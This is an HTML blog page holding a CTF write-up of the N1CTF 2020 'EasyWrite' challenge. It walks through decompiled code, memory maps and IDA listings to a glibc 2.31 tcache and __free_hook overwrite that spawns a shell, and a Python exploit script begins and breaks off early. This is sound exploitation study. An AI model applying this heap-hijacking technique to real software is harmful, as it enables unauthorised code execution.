@@ -1,0 +1,1062 @@
+<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>N1CTF 2020: EasyWrite - 152334H</title><meta name=Description content="Yet another FILE* walkthrough"><meta property="og:title" content="N1CTF 2020: EasyWrite"><meta property="og:description" content="Yet another FILE* walkthrough"><meta property="og:type" content="article"><meta property="og:url" content="https://152334H.github.io/blog/n1ctf-2020-easywrite/"><meta property="og:image" content="https://152334H.github.io/undefined.png"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-10-19T13:49:27+08:00"><meta property="article:modified_time" content="2022-08-20T09:56:31+01:00"><meta property="og:site_name" content="152334H"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://152334H.github.io/undefined.png"><meta name=twitter:title content="N1CTF 2020: EasyWrite"><meta name=twitter:description content="Yet another FILE* walkthrough"><meta name=application-name content="My cool site"><meta name=apple-mobile-web-app-title content="My cool site"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://152334H.github.io/blog/n1ctf-2020-easywrite/><link rel=prev href=https://152334H.github.io/blog/rarctf-2021-the-mound/><link rel=next href=https://152334H.github.io/blog/hosting-pwn-challenges/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"N1CTF 2020: EasyWrite","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/152334H.github.io\/blog\/n1ctf-2020-easywrite\/"},"genre":"posts","keywords":"pwn, writeup","wordcount":4505,"url":"https:\/\/152334H.github.io\/blog\/n1ctf-2020-easywrite\/","datePublished":"2020-10-19T13:49:27+08:00","dateModified":"2022-08-20T09:56:31+01:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"152334H"},"description":"Yet another FILE* walkthrough"}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"dark"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"dark"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title=152334H>Simple Thoughts</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>All Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/about/><b>About </b></a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder=Search... id=search-input-desktop>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span>
+</span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title=152334H>Simple Thoughts</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=Search... id=search-input-mobile>
+<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i></a>
+<a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>All Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/about/ title><b>About</b></a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">N1CTF 2020: EasyWrite</h1><h2 class=single-subtitle>Yet another FILE* walkthrough</h2><div class=post-meta><div class=post-meta-line><span class=post-author><a href=https://152334H.github.io/ title=Author target=_blank rel="noopener noreffer author" class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>152334H</a></span>&nbsp;<span class=post-category>included in <a href=/categories/ctf/><i class="far fa-folder fa-fw" aria-hidden=true></i>CTF</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime="October 19, 2020">October 19, 2020</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;4505 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;22 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept=true><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#tldr>TL;DR</a></li><li><a href=#starting-off>Starting off</a></li><li><a href=#write-where>Write where?</a></li><li><a href=#digging-into-mallocchttpselixirbootlincomglibcglibc-2319000sourcemallocmallocc>Digging into <a href=https://elixir.bootlin.com/glibc/glibc-2.31.9000/source/malloc/malloc.c><code>malloc.c</code></a></a></li></ul><ul><li><a href=#implementation-hell>Implementation Hell</a></li><li><a href=#triage>Triage</a></li><li><a href=#full-code>Full code</a></li><li><a href=#footnotes>Footnotes</a></li></ul></nav></div></div><div class=content id=content><h1 id=easywrite-278>EasyWrite [278]</h1><p>write? what? where?</p><p><code>nc 124.156.183.246 20000</code></p><p><strong>Files</strong>: <code>easywrite</code>, <code>libc-2.31.so</code></p><p>The library used in this writeup is <a href=https://github.com/152334H/pwnscripts target=_blank rel="noopener noreffer"><code>pwnscripts</code></a>.</p><h2 id=tldr>TL;DR</h2><ul><li>Input a fake tcache that has <code>entries[2] = __free_hook-0x8</code> and <code>count[2] = 1</code></li><li>locate the tcache pointer in libc to overwrite it with the fake one</li><li>write &ldquo;/bin/sh&rdquo; + <code>system()</code> to the next allocated memory</li><li>enjoy shell from <code>free()</code>.</li></ul><h2 id=starting-off>Starting off</h2><p>We&rsquo;ll start off with some miscellanous information.</p><p>Exact libc version:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./libc-database/identify libc-2.31.so
+</span></span><span class=line><span class=cl>libc6_2.31-0ubuntu9_amd64
+</span></span></code></pre></td></tr></table></div></div><p>Decompiler output:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>**</span><span class=n>addr</span><span class=p>;</span> <span class=c1>// [rsp-28h] [rbp-28h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>mem1</span><span class=p>;</span> <span class=c1>// [rsp-20h] [rbp-20h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=o>*</span><span class=n>mem2</span><span class=p>;</span> <span class=c1>// [rsp-18h] [rbp-18h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>setbuf</span><span class=p>(</span><span class=n>stdout</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>setbuf</span><span class=p>(</span><span class=n>stdin</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>setbuf</span><span class=p>(</span><span class=n>stderr</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>alarm</span><span class=p>(</span><span class=mi>60</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>sleep</span><span class=p>(</span><span class=mi>2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>printf</span><span class=p>(</span><span class=s>&#34;Here is your gift:%p</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>setbuf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>mem1</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>768</span><span class=p>);</span> <span class=c1>// big 0x310
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Input your message:&#34;</span><span class=p>,</span> <span class=mi>19</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>mem1</span><span class=p>,</span> <span class=mi>767</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Where to write?:&#34;</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=o>&amp;</span><span class=n>addr</span><span class=p>,</span> <span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=o>*</span><span class=n>addr</span> <span class=o>=</span> <span class=n>mem1</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>  <span class=n>mem2</span> <span class=o>=</span> <span class=n>malloc</span><span class=p>(</span><span class=mi>48</span><span class=p>);</span>  <span class=c1>// fastbin 0x40
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=s>&#34;Any last message?:&#34;</span><span class=p>,</span> <span class=mi>18</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>mem2</span><span class=p>,</span> <span class=mi>47</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=n>free</span><span class=p>(</span><span class=n>mem2</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>And checksec:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=s1>&#39;/easywrite&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>Arch</span><span class=p>:</span>     <span class=n>amd64</span><span class=o>-</span><span class=mi>64</span><span class=o>-</span><span class=n>little</span>
+</span></span><span class=line><span class=cl>    <span class=n>RELRO</span><span class=p>:</span>    <span class=n>Full</span> <span class=n>RELRO</span>
+</span></span><span class=line><span class=cl>    <span class=n>Stack</span><span class=p>:</span>    <span class=n>Canary</span> <span class=n>found</span>
+</span></span><span class=line><span class=cl>    <span class=n>NX</span><span class=p>:</span>       <span class=n>NX</span> <span class=n>enabled</span>
+</span></span><span class=line><span class=cl>    <span class=n>PIE</span><span class=p>:</span>      <span class=n>PIE</span> <span class=n>enabled</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=s1>&#39;/libc-2.31.so&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>Arch</span><span class=p>:</span>     <span class=n>amd64</span><span class=o>-</span><span class=mi>64</span><span class=o>-</span><span class=n>little</span>
+</span></span><span class=line><span class=cl>    <span class=n>RELRO</span><span class=p>:</span>    <span class=n>Partial</span> <span class=n>RELRO</span>
+</span></span><span class=line><span class=cl>    <span class=n>Stack</span><span class=p>:</span>    <span class=n>Canary</span> <span class=n>found</span>
+</span></span><span class=line><span class=cl>    <span class=n>NX</span><span class=p>:</span>       <span class=n>NX</span> <span class=n>enabled</span>
+</span></span><span class=line><span class=cl>    <span class=n>PIE</span><span class=p>:</span>      <span class=n>PIE</span> <span class=n>enabled</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>main()</code> is really simple:
+0. initialisation stuff (remove buffering, set timeout alarm)</p><ol><li>Free libc leak via <code>printf()</code></li><li>A raw <code>read(0x300-1)</code> to a pointer <code>mem1 = malloc(0x300)</code></li><li>A pointer (<code>addr</code>) is read <em>from stdin</em> via <code>read(8)</code>, and the data <em>at the pointer</em> (<code>*addr</code>) is overwritten with <code>mem1</code>.
+This is the crux of the challenge.</li><li>A raw <code>read(0x30-1)</code> to another pointer <code>mem2 = malloc(0x30)</code></li><li><code>free(mem2)</code>, and then <code>exit(0)</code> in <code>__libc_start_main</code>.</li></ol><p>Step (3) requires the user to provide a dereferencable pointer to the program. Since all protections (including ASLR) are on for <code>./easywrite</code>, the pointer we provide in step (3) must be a part of <code>libc.so.6</code>&rsquo;s allocated memory.</p><p>From there, we can condense <code>main()</code> into an even simpler outline:</p><ol><li>The user gets to replace a single pointer <em>within libc</em> with a pointer to <code>0x300-1</code> bytes of user-controlled data, and</li><li>The user gets to write <code>0x30-1</code> bytes to a <code>malloc()</code>&rsquo;d pointer that is immediately <code>free()</code>&rsquo;d.</li></ol><p>There&rsquo;s no issue with analysing the binary, but figuring out <em>what</em> to do here is a lot harder.</p><h2 id=write-where>Write where?</h2><p>As the challenge title suggests, the key to pwning the binary here is to figure out <em>where</em> in Glibc to write up. The entire shared object is pretty big, but we can cut down on the search space with a few heuristics.</p><p>First off, the bulk of libc is non-writeable. We&rsquo;re only interested in writeable addresses, so we can skip everything here (the addresses are random; focus on the offsets):</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=mh>0x00007f2afd967000</span> <span class=mh>0x00007f2afd98c000</span> <span class=mh>0x0000000000000000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2afd98c000</span> <span class=mh>0x00007f2afdb04000</span> <span class=mh>0x0000000000025000</span> <span class=n>r</span><span class=o>-</span><span class=n>x</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2afdb04000</span> <span class=mh>0x00007f2afdb4e000</span> <span class=mh>0x000000000019d000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2afdb4e000</span> <span class=mh>0x00007f2afdb4f000</span> <span class=mh>0x00000000001e7000</span> <span class=o>---</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2afdb4f000</span> <span class=mh>0x00007f2afdb52000</span> <span class=mh>0x00000000001e7000</span> <span class=n>r</span><span class=o>--</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span></code></pre></td></tr></table></div></div><p>And just focus on this part:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=mh>0x00007f2afdb52000</span> <span class=mh>0x00007f2afdb55000</span> <span class=mh>0x00000000001ea000</span> <span class=n>rw</span><span class=o>-</span> <span class=o>/</span><span class=n>usr</span><span class=o>/</span><span class=n>lib</span><span class=o>/</span><span class=n>x86_64</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>gnu</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=mf>2.31</span><span class=o>.</span><span class=n>so</span>
+</span></span><span class=line><span class=cl><span class=mh>0x00007f2afdb55000</span> <span class=mh>0x00007f2afdb5b000</span> <span class=mh>0x0000000000000000</span> <span class=n>rw</span><span class=o>-</span>
+</span></span></code></pre></td></tr></table></div></div><p>In IDA, that r/w section starts right off at libc&rsquo;s Global Offset Table. That sounds like a good place to start.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=nl>plt</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EB018</span> <span class=n>off_1EB018</span>      <span class=n>dq</span> <span class=n>offset</span> <span class=n>memmove</span>       <span class=p>;</span> <span class=n>DATA</span> <span class=nl>XREF</span><span class=p>:</span> <span class=n>bcopy</span><span class=o>-</span><span class=mf>7E4</span><span class=n>DC</span><span class=err>↑</span><span class=n>r</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=nl>plt</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EB018</span>                                         <span class=p>;</span> <span class=n>Indirect</span> <span class=n>relocation</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=nl>plt</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EB020</span> <span class=n>off_1EB020</span>      <span class=n>dq</span> <span class=n>offset</span> <span class=n>strnlen</span>       <span class=p>;</span> <span class=n>DATA</span> <span class=nl>XREF</span><span class=p>:</span> <span class=n>sub_25350</span><span class=o>+</span><span class=mi>4</span><span class=err>↑</span><span class=n>r</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=nl>plt</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EB020</span>                                         <span class=p>;</span> <span class=n>Indirect</span> <span class=n>relocation</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=nl>plt</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EB028</span> <span class=n>off_1EB028</span>      <span class=n>dq</span> <span class=n>offset</span> <span class=n>wcschr</span>        <span class=p>;</span> <span class=n>DATA</span> <span class=nl>XREF</span><span class=p>:</span> <span class=n>sub_25360</span><span class=o>+</span><span class=mi>4</span><span class=err>↑</span><span class=n>r</span>
+</span></span><span class=line><span class=cl><span class=p>...</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=nl>plt</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EB178</span> <span class=n>off_1EB178</span>      <span class=n>dq</span> <span class=n>offset</span> <span class=n>strcasecmp</span>    <span class=p>;</span> <span class=n>DATA</span> <span class=nl>XREF</span><span class=p>:</span> <span class=n>sub_25600</span><span class=o>+</span><span class=mi>4</span><span class=err>↑</span><span class=n>r</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=nl>plt</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EB178</span>                                         <span class=p>;</span> <span class=n>Indirect</span> <span class=n>relocation</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=nl>plt</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EB180</span> <span class=n>off_1EB180</span>      <span class=n>dq</span> <span class=n>offset</span> <span class=n>strncpy</span>       <span class=p>;</span> <span class=n>DATA</span> <span class=nl>XREF</span><span class=p>:</span> <span class=n>sub_25610</span><span class=o>+</span><span class=mi>4</span><span class=err>↑</span><span class=n>r</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=nl>plt</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EB180</span>                                         <span class=p>;</span> <span class=n>Indirect</span> <span class=n>relocation</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=nl>plt</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EB188</span> <span class=n>off_1EB188</span>      <span class=n>dq</span> <span class=n>offset</span> <span class=n>memmove</span>       <span class=p>;</span> <span class=n>DATA</span> <span class=nl>XREF</span><span class=p>:</span> <span class=n>sub_25620</span><span class=o>+</span><span class=mi>4</span><span class=err>↑</span><span class=n>r</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=n>got</span><span class=p>.</span><span class=nl>plt</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EB188</span> <span class=n>_got_plt</span>        <span class=n>ends</span>                    <span class=p>;</span> <span class=n>Indirect</span> <span class=n>relocation</span>
+</span></span></code></pre></td></tr></table></div></div><p>&mldr;or it would&rsquo;ve been, if there were any useful functions in the whole list. Long story short; all of the functions there are never called by the program<sup>1</sup>, so we&rsquo;ll move on.</p><p>After the Procedure Linkage Table, there&rsquo;s a long stretch of garbage in the form of the <code>.data</code> and <code>.bss</code> sections, along with a few other <code>__libc_*</code> sections that are basically never referenced either<sup>2</sup>.</p><p>A few hours of blank staring later, and my eyes finally saw something I&rsquo;d missed the last 10 times I tried scanning IDA View-A:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>.</span><span class=nl>bss</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EEB28</span>                 <span class=n>public</span> <span class=n>__free_hook</span> <span class=p>;</span> <span class=n>weak</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>bss</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EEB28</span> <span class=p>;</span> <span class=kr>__int64</span> <span class=p>(</span><span class=kr>__fastcall</span> <span class=o>*</span><span class=n>_free_hook</span><span class=p>)(</span><span class=n>_QWORD</span><span class=p>,</span> <span class=n>_QWORD</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>bss</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EEB28</span> <span class=n>__free_hook</span>     <span class=n>dq</span> <span class=o>?</span>                    <span class=p>;</span> <span class=n>DATA</span> <span class=nl>XREF</span><span class=p>:</span> <span class=nl>LOAD</span><span class=p>:</span><span class=mo>000000000000</span><span class=mi>8</span><span class=n>A48</span><span class=err>↑</span><span class=n>o</span>
+</span></span><span class=line><span class=cl><span class=p>.</span><span class=nl>bss</span><span class=p>:</span><span class=mo>00000000001</span><span class=n>EEB28</span>                                         <span class=p>;</span> <span class=p>.</span><span class=nl>got</span><span class=p>:</span><span class=n>__free_hook_ptr</span><span class=err>↑</span><span class=n>o</span>
+</span></span></code></pre></td></tr></table></div></div><p><em>__free_hook? Isn&rsquo;t that that thing that I heard about once a long time ago in a <a href=https://teamrocketist.github.io/2019/09/09/Pwn-N1CTF-2019-warmup/ target=_blank rel="noopener noreffer">writeup</a> somewhere?</em></p><p>To repeat something you may already know: <code>__free_hook()</code> is a function pointer that overrides the default behaviour of <code>free()</code> iff <code>__free_hook != NULL</code>. If we change <code>__free_hook</code> to point to a <code>one_gadget</code> (or something), we&rsquo;ll have beaten the challenge.</p><p>Let&rsquo;s try that.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwnscripts</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;easywrite&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc_database</span> <span class=o>=</span> <span class=s1>&#39;libc-database&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span> <span class=o>=</span> <span class=s1>&#39;libc-2.31.so&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;debug&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>calc_base</span><span class=p>(</span><span class=s1>&#39;setbuf&#39;</span><span class=p>,</span> <span class=n>unpack_hex</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()))</span>
+</span></span><span class=line><span class=cl>
